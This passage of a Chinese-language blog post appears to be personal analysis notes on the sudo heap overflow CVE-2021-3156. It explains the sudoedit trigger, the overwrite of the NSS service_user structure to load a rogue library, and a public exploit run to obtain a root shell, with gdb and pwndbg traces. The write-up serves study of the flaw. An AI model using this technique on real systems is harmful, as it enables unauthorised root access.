<span class="keyword">int</span> mode = <span class="number">0</span>;		<span class="comment">/* what mode is sudo to be run in? */</span></span><br><span class="line">    <span class="keyword">int</span> flags = <span class="number">0</span>;		<span class="comment">/* mode flags */</span></span><br><span class="line">    <span class="keyword">int</span> valid_flags = DEFAULT_VALID_FLAGS;</span><br><span class="line">		...</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* First, check to see if we were invoked as &quot;sudoedit&quot;. */</span></span><br><span class="line">    proglen = <span class="built_in">strlen</span>(progname);</span><br><span class="line">    <span class="keyword">if</span> (proglen &gt; <span class="number">4</span> &amp;&amp; <span class="built_in">strcmp</span>(progname + proglen - <span class="number">4</span>, <span class="string">&quot;edit&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">	progname = <span class="string">&quot;sudoedit&quot;</span>;</span><br><span class="line">	mode = MODE_EDIT;</span><br><span class="line">	sudo_settings[ARG_SUDOEDIT].value = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">		<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((ch = getopt_long(argc, argv, short_opts, long_opts, <span class="literal">NULL</span>)) != <span class="number">-1</span>) &#123;   <span class="comment">//解析命令行参数</span></span><br><span class="line">        <span class="keyword">switch</span> (ch) &#123;</span><br><span class="line">        ……</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:                </span><br><span class="line">            mode = MODE_EDIT;             </span><br><span class="line">            valid_flags = MODE_NONINTERACTIVE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        ……</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:                   </span><br><span class="line">            SET(flags, MODE_SHELL);          </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        ……</span><br><span class="line">        &#125;</span><br><span class="line">        ……</span><br><span class="line">    &#125;</span><br><span class="line">     ……</span><br><span class="line">&#125;</span><br><span class="line">……</span><br><span class="line"><span class="keyword">if</span> ((flags &amp; valid_flags) != flags)    <span class="comment">//同时设置 -s -e会在此处退出</span></span><br><span class="line">    usage(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到如果调用程序为sudoedit的时候，会为其添加MODE_EDIT flag，这时再使用-s 即可满足条件且不会被转义。</p>
<h2 id="0x02-利用"><a href="#0x02-利用" class="headerlink" title="0x02 利用"></a>0x02 利用</h2><p>在写具体利用前我们先整理下：</p>
<p>现在我们有了一个堆溢出， 能够越界写并且写的内容是完全可控的。同时存储我们数据的user_args空间也是可控的，大小可控内容可控。</p>
<p>同时也有限制， 溢出只能触发一次。我们也没有办法绕过aslr， 所以像常规的修改链表指针、ret2libc 之类的技巧这里就完全用不上了。</p>
<p>讲道理这里我也不知道该怎么去利用了，但是Qualys团队牛逼啊，他们通过爆破来找寻找漏洞利用方式：</p>
<p>在gdb中执行sudo， 溢出user_args 缓冲区并随即选择下面的参数：</p>
<ul>
<li>向sudo传递LC环境变量，以及他们的长度（使用“C.UTF-8”并追加一个随机字符”@modifier”）</li>
<li>我们溢出的”user_args”缓冲区的大小</li>
<li>是否通过身份认证代码（-A  ， -n， -u）</li>
</ul>
<p>还真让他们给找到了，找到三种利用方式，这里我们只看比较好用的一种：覆写service_user结构。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">service_user</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* And the link to the next entry.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">service_user</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* Action according to result.  */</span></span><br><span class="line">  lookup_actions actions[<span class="number">5</span>];</span><br><span class="line">  <span class="comment">/* Link to the underlying library object.  */</span></span><br><span class="line">  service_library *library;</span><br><span class="line">  <span class="comment">/* Collection of known functions.  */</span></span><br><span class="line">  <span class="keyword">void</span> *known;</span><br><span class="line">  <span class="comment">/* Name of the service (`files&#x27;, `dns&#x27;, `nis&#x27;, ...).  */</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">0</span>];</span><br><span class="line">&#125; service_user;</span><br></pre></td></tr></table></figure>

<p>Name Service Switch(NSS)是unix操作系统中的一项机制，主要用于为名称解析机制提供来源，也就是选择对应的so文件提供服务。配置文件在/etc/nsswitch.conf中：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">✗ cat /etc/nsswitch.conf </span><br><span class="line"><span class="comment"># /etc/nsswitch.conf</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Example configuration of GNU Name Service Switch functionality.</span></span><br><span class="line"><span class="comment"># If you have the `glibc-doc-reference&#x27; and `info&#x27; packages installed, try:</span></span><br><span class="line"><span class="comment"># `info libc &quot;Name Service Switch&quot;&#x27; for information about this file.</span></span><br><span class="line"></span><br><span class="line">passwd:         files systemd</span><br><span class="line">group:          files systemd</span><br><span class="line">shadow:         files</span><br><span class="line">gshadow:        files</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>针对每种“数据库”， 都有对应的libnss_XXXXX.so.1与之对应，在程序中通过nss_load_library 加载对应的库，之后在调用对应函数时会先调用 nss_lookup_function进行查找。</p>
<p>根据nss_load_library 函数得知： 当对应service_user中的library为空时，会通过_libc_dlopen 调用“libnss_”+”service_user→name”+”.so”。所以我们通过覆写service_user结构中的library和name字段即可使程序加载我们自己设置的恶意libc进而执行我们的代码。</p>
<p>这里再说一下提权</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">✗ ls -alth /usr/<span class="built_in">local</span>/bin/sudo*</span><br><span class="line">lrwxrwxrwx 1 root root    4 Sep 25 01:59 /usr/<span class="built_in">local</span>/bin/sudoedit -&gt; sudo</span><br><span class="line">-rwsr-xr-x 1 root root 586K Sep 25 01:59 /usr/<span class="built_in">local</span>/bin/sudo</span><br></pre></td></tr></table></figure>

<p>可以看到sudoedit 就是sudo的一个链接，sudo 拥有一个特殊的权限标记s， 表明它的所有者为root。所以当我们通过它来执行setuid、setgid的时候也就是相当于通过root身份来完成的。所以在我们伪造的so中只需要执行setuid(0), setgid(0)便可以提权，最后再执行一个shell。</p>
<p>这里拿测试比较稳定的<a target="_blank" rel="noopener" href="https://github.com/CptGibbon/CVE-2021-3156">exp</a>来调试，应对上面的理论。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  CVE-2021-3156 git:(main) ✗ zsh</span><br><span class="line">➜  CVE-2021-3156 git:(main) ✗ whoami</span><br><span class="line">x</span><br><span class="line">➜  CVE-2021-3156 git:(main) ✗ ./exploit </span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),1000(x)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;catch exec\n set follow-exec-mode new\n r\n b policy_check\n c\n b sudoers.c:865 \n b nss_load_librarty\n&quot;</span> &gt; dbg.txt</span><br><span class="line">sudo gdb exploit -x dbg.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -s files [heap]</span><br><span class="line">[heap]          0x55934bcebae0 0x78650073656c6966 /* <span class="string">&#x27;files&#x27;</span> */</span><br><span class="line">[heap]          0x55934bcef380 0x530073656c6966 /* <span class="string">&#x27;files&#x27;</span> */</span><br><span class="line">[heap]          0x55934bcefd30 0x73656c6966 /* <span class="string">&#x27;files&#x27;</span> */</span><br><span class="line">[heap]          0x55934bcefd90 0x73656c6966 /* <span class="string">&#x27;files&#x27;</span> */</span><br><span class="line">[heap]          0x55934bcefdf0 0x73656c6966 /* <span class="string">&#x27;files&#x27;</span> */</span><br><span class="line">[heap]          0x55934bcefef0 0x73656c6966 /* <span class="string">&#x27;files&#x27;</span> */</span><br><span class="line">[heap]          0x55934bceffa0 0x73656c6966 /* <span class="string">&#x27;files&#x27;</span> */</span><br><span class="line">[heap]          0x55934bcf0050 0x2010073656c6966 /* <span class="string">&#x27;files&#x27;</span> */</span><br><span class="line">[heap]          0x55934bcf00f0 0x10073656c6966 /* <span class="string">&#x27;files&#x27;</span> */</span><br><span class="line">[heap]          0x55934bcf0190 0x73656c6966 /* <span class="string">&#x27;files&#x27;</span> */</span><br><span class="line">[heap]          0x55934bcf028d <span class="string">&#x27;files.so.2&#x27;</span></span><br><span class="line">[heap]          0x55934bcf02bd <span class="string">&#x27;files.so.2&#x27;</span></span><br><span class="line">[heap]          0x55934bcf11a7 <span class="string">&#x27;files.so.2&#x27;</span></span><br><span class="line">[heap]          0x55934bcfbcc8 0x6e692073656c6966 (<span class="string">&#x27;files in&#x27;</span>)</span><br><span class="line">[heap]          0x55934bcfbd8c 0x6e692073656c6966 (<span class="string">&#x27;files in&#x27;</span>)</span><br><span class="line">[heap]          0x55934bcfbe38 0x6e6f2073656c6966 (<span class="string">&#x27;files on&#x27;</span>)</span><br><span class="line">[heap]          0x55934bcfcd28 0x6e692073656c6966 (<span class="string">&#x27;files in&#x27;</span>)</span><br><span class="line">[heap]          0x55934bcfcdec 0x6e692073656c6966 (<span class="string">&#x27;files in&#x27;</span>)</span><br><span class="line">[heap]          0x55934bcfce98 0x6e6f2073656c6966 (<span class="string">&#x27;files on&#x27;</span>)</span><br><span class="line">pwndbg&gt; hexdump 0x55934bcef380</span><br><span class="line">+0000 0x55934bcef380  66 69 6c 65  73 00 53 00  31 01 00 00  00 00 00 00  │file│s.S.│1...│....│</span><br><span class="line">+0010 0x55934bcef390  b0 f0 ce 4b  93 55 00 00  01 00 00 00  00 00 00 00  │...K│.U..│....│....│</span><br><span class="line">+0020 0x55934bcef3a0  00 00 00 00  00 00 00 00  a0 f2 ce 4b  93 55 00 00  │....│....│...K│.U..│</span><br><span class="line">+0030 0x55934bcef3b0  e0 e2 ce 4b  93 55 00 00  50 eb ce 4b  93 55 00 00  │...K│.U..│P..K│.U..│</span><br><span class="line">pwndbg&gt; hexdump 0x55934bcef350</span><br><span class="line">+0000 0x55934bcef350  a0 <span class="built_in">fc</span> ce 4b  93 55 00 00  00 00 00 00  00 00 00 00  │...K│.U..│....│....│</span><br><span class="line">+0010 0x55934bcef360  00 00 00 00  01 00 00 00  01 00 00 00  6e 2f 4c 43  │....│....│....│n/LC│</span><br><span class="line">+0020 0x55934bcef370  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">+0030 0x55934bcef380  66 69 6c 65  73 00 53 00  31 01 00 00  00 00 00 00  │file│s.S.│1...│....│</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────────────────────────</span><br><span class="line">In file: /home/x/Documents/cve-2021-sudo/sudo-SUDO_1_8_31/plugins/sudoers/sudoers.c</span><br><span class="line">   860 		 * When running a <span class="built_in">command</span> via a shell, the sudo front-end</span><br><span class="line">   861 		 * escapes potential meta chars.  We unescape non-spaces</span><br><span class="line">   862 		 * <span class="keyword">for</span> sudoers matching and logging purposes.</span><br><span class="line">   863 		 */</span><br><span class="line">   864 		<span class="keyword">for</span> (to = user_args, av = NewArgv + 1; (from = *av); av++) &#123;</span><br><span class="line"> ► 865 		    <span class="keyword">while</span> (*from) &#123;</span><br><span class="line">   866 			<span class="keyword">if</span> (from[0] == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; !isspace((unsigned char)from[1]))</span><br><span class="line">   867 			    from++;</span><br><span class="line">   868 			*to++ = *from++;</span><br><span class="line">   869 		    &#125;</span><br><span class="line">   870 		    *to++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7ffeffee5480 ◂— 0x7ffe00000000</span><br><span class="line">01:0008│     0x7ffeffee5488 ◂— 0x0</span><br><span class="line">02:0010│     0x7ffeffee5490 ◂— 0x7ffe00020002</span><br><span class="line">03:0018│     0x7ffeffee5498 ◂— 0x14100c89</span><br><span class="line">04:0020│     0x7ffeffee54a0 ◂— 0x3000000000</span><br><span class="line">05:0028│     0x7ffeffee54a8 —▸ 0x7ffeffee5540 —▸ 0x7ffeffee55c0 ◂— 0x0</span><br><span class="line">06:0030│     0x7ffeffee54b0 —▸ 0x7ffeffee54c0 ◂— 0xffffffffffffffff</span><br><span class="line">07:0038│     0x7ffeffee54b8 ◂— 0x0</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0   0x7fda1309b1f0 sudoers_policy_main+3392</span><br><span class="line">   f 1   0x7fda1309b1f0 sudoers_policy_main+3392</span><br><span class="line">   f 2   0x7fda130940fa sudoers_policy_check+154</span><br><span class="line">   f 3   0x55934adf9c46 main+1030</span><br><span class="line">   f 4   0x55934adf9c46 main+1030</span><br><span class="line">   f 5   0x7fda13f050b3 __libc_start_main+243</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p to</span><br><span class="line"><span class="variable">$1</span> = 0x55934bceedb0 <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt; x/6gx to-0x10</span><br><span class="line">0x55934bceeda0:	0x0000000000000000	0x00000000000000f1</span><br><span class="line">0x55934bceedb0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55934bceedc0:	0x6170676e616c2d65	0x4141406e652f6b63</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Thread 2.1 <span class="string">&quot;sudoedit&quot;</span> hit Breakpoint 4, nss_load_library (ni=ni@entry=0x55934bcef350) at nsswitch.c:329</span><br><span class="line">329	nsswitch.c: No such file or directory.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">*RAX  0x7fda140969d7 ◂— <span class="string">&#x27;initgroups_dyn&#x27;</span></span><br><span class="line">*RBX  0x55934bcef350 ◂— <span class="string">&#x27;XXXXXXXXXXXXXXXX&#x27;</span></span><br><span class="line">*RCX  0x55934bceb010 ◂— 0x200000001</span><br><span class="line">*RDX  0x1</span><br><span class="line">*RDI  0x55934bcef350 ◂— <span class="string">&#x27;XXXXXXXXXXXXXXXX&#x27;</span></span><br><span class="line">*RSI  0x55934bcfb670 ◂— 0x0</span><br><span class="line">*R8   0x55934bd03b90 —▸ 0x7fda140969d7 ◂— <span class="string">&#x27;initgroups_dyn&#x27;</span></span><br><span class="line">*R9   0x7ffeffee4bb0 ◂— 0xff00</span><br><span class="line">*R10  0xffffffff</span><br><span class="line">*R11  0x0</span><br><span class="line">*R12  0x55934bcf6de0 —▸ 0x55934bd03b90 —▸ 0x7fda140969d7 ◂— <span class="string">&#x27;initgroups_dyn&#x27;</span></span><br><span class="line">*R13  0x7ffeffee4d18 —▸ 0x7fda140969d7 ◂— <span class="string">&#x27;initgroups_dyn&#x27;</span></span><br><span class="line">*R14  0x55934bcef378 —▸ 0x55934bcf6de0 —▸ 0x55934bd03b90 —▸ 0x7fda140969d7 ◂— <span class="string">&#x27;initgroups_dyn&#x27;</span></span><br><span class="line">*R15  0x55934bd03b90 —▸ 0x7fda140969d7 ◂— <span class="string">&#x27;initgroups_dyn&#x27;</span></span><br><span class="line">*RBP  0x7ffeffee4d60 ◂— 0x0</span><br><span class="line">*RSP  0x7ffeffee4d08 —▸ 0x7fda14024ed9 (__nss_lookup_function+233) ◂— <span class="built_in">test</span>   eax, eax</span><br><span class="line">*RIP  0x7fda140244c0 (nss_load_library) ◂— push   rbp</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x7fda140244c0 &lt;nss_load_library&gt;       push   rbp</span><br><span class="line">   0x7fda140244c1 &lt;nss_load_library+1&gt;     mov    rbp, rsp</span><br><span class="line">   0x7fda140244c4 &lt;nss_load_library+4&gt;     push   r15</span><br><span class="line">   0x7fda140244c6 &lt;nss_load_library+6&gt;     push   r14</span><br><span class="line">   0x7fda140244c8 &lt;nss_load_library+8&gt;     push   r13</span><br><span class="line">   0x7fda140244ca &lt;nss_load_library+10&gt;    push   r12</span><br><span class="line">   0x7fda140244cc &lt;nss_load_library+12&gt;    mov    r12, rdi</span><br><span class="line">   0x7fda140244cf &lt;nss_load_library+15&gt;    push   rbx</span><br><span class="line">   0x7fda140244d0 &lt;nss_load_library+16&gt;    sub    rsp, 0x28</span><br><span class="line">   0x7fda140244d4 &lt;nss_load_library+20&gt;    mov    rbx, qword ptr [rdi + 0x20]</span><br><span class="line">   0x7fda140244d8 &lt;nss_load_library+24&gt;    mov    rax, qword ptr fs:[0x28]</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7ffeffee4d08 —▸ 0x7fda14024ed9 (__nss_lookup_function+233) ◂— <span class="built_in">test</span>   eax, eax</span><br><span class="line">01:0008│     0x7ffeffee4d10 —▸ 0x7fda140c9be0 (main_arena+96) —▸ 0x55934bd03ba0 ◂— 0x0</span><br><span class="line">02:0010│ r13 0x7ffeffee4d18 —▸ 0x7fda140969d7 ◂— <span class="string">&#x27;initgroups_dyn&#x27;</span></span><br><span class="line">03:0018│     0x7ffeffee4d20 ◂— 0x40004</span><br><span class="line">04:0020│     0x7ffeffee4d28 ◂— 0x665ff34213612600</span><br><span class="line">05:0028│     0x7ffeffee4d30 ◂— 0x40010</span><br><span class="line">06:0030│     0x7ffeffee4d38 ◂— 0x1</span><br><span class="line">07:0038│     0x7ffeffee4d40 —▸ 0x7ffeffee4de8 ◂— 0x10001</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0   0x7fda140244c0 nss_load_library</span><br><span class="line">   f 1   0x7fda14024ed9 __nss_lookup_function+233</span><br><span class="line">   f 2   0x7fda13fc013f internal_getgrouplist+175</span><br><span class="line">   f 3   0x7fda13fc03ed getgrouplist+109</span><br><span class="line">   f 4   0x7fda140fc316 sudo_getgrouplist2_v1+198</span><br><span class="line">   f 5   0x7fda130ad593 sudo_make_gidlist_item+451</span><br><span class="line">   f 6   0x7fda130ac33e sudo_get_gidlist+286</span><br><span class="line">   f 7   0x7fda130a609d runas_getgroups+93</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; hexdump <span class="variable">$rdi</span></span><br><span class="line">+0000 0x55934bcef350  58 58 58 58  58 58 58 58  58 58 58 58  58 58 58 58  │XXXX│XXXX│XXXX│XXXX│</span><br><span class="line">+0010 0x55934bcef360  00 00 00 00  00 00 00 00  00 58 58 58  58 58 58 58  │....│....│.XXX│XXXX│</span><br><span class="line">+0020 0x55934bcef370  00 00 00 00  00 00 00 00  e0 6d cf 4b  93 55 00 00  │....│....│.m.K│.U..│</span><br><span class="line">+0030 0x55934bcef380  78 2f 78 00  5a 00 53 00  31 01 00 00  00 00 00 00  │x/x.│Z.S.│1...│....│</span><br><span class="line"><span class="comment"># 对比上面的地址，已经将files覆盖成了&quot;x/x&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="要点（坑）"><a href="#要点（坑）" class="headerlink" title="要点（坑）"></a>要点（坑）</h3><p>通过设置user_args 溢出覆盖service_user 结构的原理我们已经比较清楚了，而且这里是作者通过爆破的方式找到的利用点。</p>
<p>但是这里有个问题，如何将user_args分配在service_user结构的附近。因为如果两者相距过远，在溢出过程中可能会覆盖一些关键结构，造成程序退出。所以这里涉及到将特定内存块分配到特定的位置上，也就是所谓的“堆风水”。这里的布局方式也是不知道，只能归功于爆破和fuzz &gt;##&lt;</p>
<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><ol>
<li>漏洞本身是个逻辑问题造成的堆溢出</li>
<li>通过使用sudoedit绕过程序中的限制触发漏洞</li>
<li>利用sudo函数中开始地方调用的setlocale相关函数控制user_args堆的大小以及布局堆的排布</li>
<li>通过堆风水配合溢出，覆盖service_user 结构的library=NULL和name字段，进而使得nss_load_library 加载可控的库文件</li>
<li>至于如何找到nss_load_library 这个会被调用的点？←——— 爆破+fuzz</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//根据这个调用栈，手动找也不是不行，可能得花超多的时间.....</span><br><span class="line"> ► f 0   0x7f89905114c0 nss_load_library</span><br><span class="line">   f 1   0x7f8990511ed9 __nss_lookup_function+233</span><br><span class="line">   f 2   0x7f89904ad13f internal_getgrouplist+175</span><br><span class="line">   f 3   0x7f89904ad3ed getgrouplist+109</span><br><span class="line">   f 4   0x7f89905e9316 sudo_getgrouplist2_v1+198</span><br><span class="line">   f 5   0x7f898f59a593 sudo_make_gidlist_item+451</span><br><span class="line">   f 6   0x7f898f59933e sudo_get_gidlist+286</span><br><span class="line">   f 7   0x7f898f59309d runas_getgroups+93</span><br><span class="line">───────────────────────────────────────────────</span><br><span class="line">► f 0   0x7f898f593040 runas_getgroups</span><br><span class="line">   f 1   0x7f898f584872 set_perms+1650</span><br><span class="line">   f 2   0x7f898f584872 set_perms+1650</span><br><span class="line">   f 3   0x7f898f57ed5a sudoers_lookup+106</span><br><span class="line">   f 4   0x7f898f587b41 sudoers_policy_main+1681</span><br><span class="line">   f 5   0x7f898f5810fa sudoers_policy_check+154</span><br><span class="line">   f 6   0x55fda0420c46 main+1030</span><br><span class="line">   f 7   0x55fda0420c46 main+1030</span><br></pre></td></tr></table></figure>

<p>除了利用部分，其实我对这个漏洞的发现也比较好奇。虽然sudo是有源码可以fuzz的，但是基于分析过程中所说的几项限制，似乎从fuzz的角度是很难发现的。最后在网上搜到当事团队的视频，讲他们其实是通过代码审计发现的：</p>
<p>￼<img src="./Qualys_auditCode.png" alt="Qualys_auditCode"></p>
<p>另外，发现利用方式那里也很有意思。通过爆破的方式，利用程序一开始便加载的定位相关函数，制造crash来寻找利用方式。学到了学到了。。。</p>
<h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><ol>
<li><a target="_blank" rel="noopener" href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt">Heap-based buffer overflow in Sudo (CVE-2021-3156)</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156">exploit from lockedbyte</a></li>
<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1177687">Linux系统内部的名称解析与安全认证</a></li>
<li><a target="_blank" rel="noopener" href="https://forum.90sec.com/t/topic/1552">CVE-2021-3156sudo堆溢出分析</a></li>
</ol>
</div><div class="article-licensing box"><div class="licensing-title"><p>cve-2021-3156 分析笔记（有坑没填）</p><p><a href="https://avcatshy.github.io/2021/09/28/cve-2021-3156-分析笔记（有坑没填）/">https://avcatshy.github.io/2021/09/28/cve-2021-3156-分析笔记（有坑没填）/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>vlinkstone</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2021-09-28</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2021-09-29</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Linux/">Linux</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/09/29/Netgear-R6400v2-%E5%9B%BA%E4%BB%B6%E9%87%8D%E6%89%93%E5%8C%85/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">Netgear R6400v2 固件重打包</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/07/11/%E5%B0%8F%E8%AE%B0iOS%E5%8F%8D%E8%B0%83%E8%AF%95/"><span class="level-item">小记iOS反调试</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div id="disqus_thread"><noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div><script>var disqus_config = function () {
